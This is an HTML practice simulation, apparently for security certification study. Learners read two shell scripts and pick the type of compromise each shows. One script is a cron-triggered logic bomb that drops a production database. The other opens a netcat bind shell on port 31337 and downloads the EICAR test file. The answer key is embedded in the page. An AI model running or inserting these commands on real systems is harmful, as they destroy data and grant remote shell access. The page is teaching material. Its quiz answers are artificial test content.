<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sim 9: Identify the Compromise</title>
    <link rel="stylesheet" href="../../../../assets/style.css">
    <style>
        .sim-top-bar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 1rem;
        }

        .info-btn {
            padding: 8px;
            background-color: var(--interactive-blue);
            border: none;
            border-radius: 5px;
            cursor: pointer;
            color: white;
            line-height: 0;
        }

        .info-btn:hover {
            background-color: var(--interactive-blue-hover);
        }

        .info-btn svg {
            width: 24px;
            height: 24px;
            fill: currentColor;
        }

        .compromise-container { 
            background-color: var(--bg-dark-secondary); 
            padding: 20px; 
            border-radius: 8px; 
            margin-top: 20px;
        }

        .tabs { 
            display: flex; 
            border-bottom: 1px solid var(--border-color); 
            margin-bottom: 15px; 
        }

        .tab-btn { 
            padding: 10px 15px; 
            cursor: pointer; 
            background-color: transparent; 
            border: none; 
            color: var(--text-light); 
            border-bottom: 3px solid transparent; 
            font-size: 1em;
        }

        .tab-btn.active { 
            border-bottom-color: var(--accent-green); 
            font-weight: bold; 
        }

        .tab-content { 
            display: none; 
        }

        .tab-content.active { 
            display: block; 
        }

        .terminal { 
            background-color: var(--bg-dark-main); 
            color: #f0f0f0; 
            font-family: 'Courier New', Courier, monospace; 
            padding: 15px; 
            border-radius: 5px; 
            white-space: pre-wrap; 
            min-height: 150px;
        }

        .answer-area { 
            margin-top: 20px; 
            padding-top: 20px; 
            border-top: 1px solid var(--border-color); 
        }

        .answer-group { 
            margin-bottom: 15px; 
        }

        .answer-group label { 
            display: inline-block; 
            margin-right: 15px; 
            cursor: pointer;
        }
        
    </style>
</head>
<body>

    <div class="sim-container">
        <div class="sim-top-bar">
        <a href="../index.html" class="back-btn">Back to Menu</a>
            <button id="infoBtn" class="info-btn" title="Show Instructions">
                <svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
            </button>
        </div>

        <h3>Sim 9: Identify the Compromise</h3>
        <div class="compromise-container">
            <div class="tabs">
                <button class="tab-btn active" data-tab="output1">Command Output 1</button>
                <button class="tab-btn" data-tab="output2">Command Output 2</button>
            </div>
            
            <div id="output1" class="tab-content active">
                <div class="terminal" id="terminal1"></div>
                <div class="answer-area">
                    <h4>Compromise Type 1</h4>
                    <div class="answer-group" id="answers-output1"></div>
                </div>
            </div>

            <div id="output2" class="tab-content">
                <div class="terminal" id="terminal2"></div>
                 <div class="answer-area">
                    <h4>Compromise Type 2</h4>
                    <div class="answer-group" id="answers-output2"></div>
                </div>
            </div>
        </div>
        <div class="sim-controls">
            <div></div>
            <div>
                <button class="sim-check-btn" id="checkBtn">Check Answer</button>
                <button class="sim-reset-btn" id="resetBtn">Reset Sim</button>
            </div>
        </div>
    </div>

    <div id="modal" class="modal">
        <div class="modal-content">
            <div id="modal-body-content"></div>
            <button class="modal-close-btn" onclick="closeModal()">Close</button>
        </div>
    </div>

    <script>
        const modal = document.getElementById("modal");
        const modalBody = document.getElementById("modal-body-content");
        function showModal(content, isCentered = true) {
            modalBody.innerHTML = '';
            if (typeof content === 'string') {
                const p = document.createElement('p');
                p.style.whiteSpace = 'pre-wrap';
                p.textContent = content;
                modalBody.appendChild(p);
            } else {
                modalBody.appendChild(content);
            }
            modal.querySelector('.modal-content').classList.toggle('centered-text', isCentered);
            modal.style.display = "flex";
        }
        function closeModal() { modal.style.display = "none"; }
        modal.onclick = e => { if (e.target.id === 'modal') closeModal(); };

        const sim9 = {
            state: {
                output1: null,
                output2: null
            },
            data: {
                info: `SIMULATION\nAn incident has occurred in the production environment.\n\nINSTRUCTIONS\nAnalyze the command outputs and identify the type of compromise.\n\nIf at any time you would like to bring back the initial state of the simulation, please click the Reset button.`,
                options: ["RAT", "Backdoor", "Logic Bomb", "SQL Injection", "Rootkit"],
                correctAnswers: {
                    output1: "Logic Bomb",
                    output2: "RAT"
                },
                scripts: {
                    output1: `$ cat /var/log/www/file.sh
#!/bin/bash

user=\`grep john /etc/password\`
If [ $user = "" ]; then
    mysql -u root -p mys3cr3tdbpw -e "drop database production"
fi

$ crontab -l
*/5 * * * * /var/log/www/file.sh`,
                    output2: `$ cat /var/log/www/file.sh
#!/bin/bash

date=\`date +%Y-%m-%d\`

echo "type in your full name:"
read loggedInName
nc -l -p 31337 -e /bin/bash
wget www.eicar.org/download/eicar.com.txt
echo "Hello, $loggedInName the virus file has been downloaded"`
                }
            },
            setup: function() {
                this.state = { output1: null, output2: null }; 

                document.getElementById('terminal1').textContent = this.data.scripts.output1;
                document.getElementById('terminal2').textContent = this.data.scripts.output2;

                const answers1Container = document.getElementById('answers-output1');
                const answers2Container = document.getElementById('answers-output2');
                answers1Container.innerHTML = '';
                answers2Container.innerHTML = '';
                
                this.data.options.forEach(opt => {
                    answers1Container.innerHTML += `<label><input type="radio" name="compromise1" value="${opt}"> ${opt}</label>`;
                    answers2Container.innerHTML += `<label><input type="radio" name="compromise2" value="${opt}"> ${opt}</label>`;
                });

                document.querySelectorAll('.tab-btn').forEach(btn => {
                    btn.addEventListener('click', (e) => this.openTab(e));
                });

                document.querySelectorAll('input[name="compromise1"]').forEach(radio => {
                    radio.addEventListener('change', (e) => this.state.output1 = e.target.value);
                });
                document.querySelectorAll('input[name="compromise2"]').forEach(radio => {
                    radio.addEventListener('change', (e) => this.state.output2 = e.target.value);
                });
            },
            openTab: function(evt) {
                const tabName = evt.currentTarget.dataset.tab;
                document.querySelectorAll('.tab-content').forEach(tc => tc.classList.remove('active'));
                document.querySelectorAll('.tab-btn').forEach(tb => tb.classList.remove('active'));
                document.getElementById(tabName).classList.add('active');
                evt.currentTarget.classList.add('active');
            },
            check: function() {
                if (!this.state.output1 || !this.state.output2) {
                    showModal("Please select an answer for both command outputs.", true);
                    return;
                }

                const isCorrect1 = this.state.output1 === this.data.correctAnswers.output1;
                const isCorrect2 = this.state.output2 === this.data.correctAnswers.output2;

                if (isCorrect1 && isCorrect2) {
                    showModal("Correct! You have identified both compromise types accurately.", true);
                } else {
                    let feedback = "Incorrect. Please review your selections.\n\n";
                    feedback += `Command Output 1: Your answer was ${this.state.output1}. `;
                    feedback += isCorrect1 ? 'This is correct.\n' : 'This is incorrect.\n';
                    feedback += `Command Output 2: Your answer was ${this.state.output2}. `;
                    feedback += isCorrect2 ? 'This is correct.' : 'This is incorrect.';
                    showModal(feedback, false);
                }
            }
        };

        document.addEventListener('DOMContentLoaded', () => {
            sim9.setup();
            document.getElementById('checkBtn').addEventListener('click', () => sim9.check());
            document.getElementById('resetBtn').addEventListener('click', () => sim9.setup());
            document.getElementById('infoBtn').onclick = () => {
                showModal(sim9.data.info, false);
            };
        });
    </script>
<script src="../../../../disable_dev_tools.js"></script>
</body>
</html>
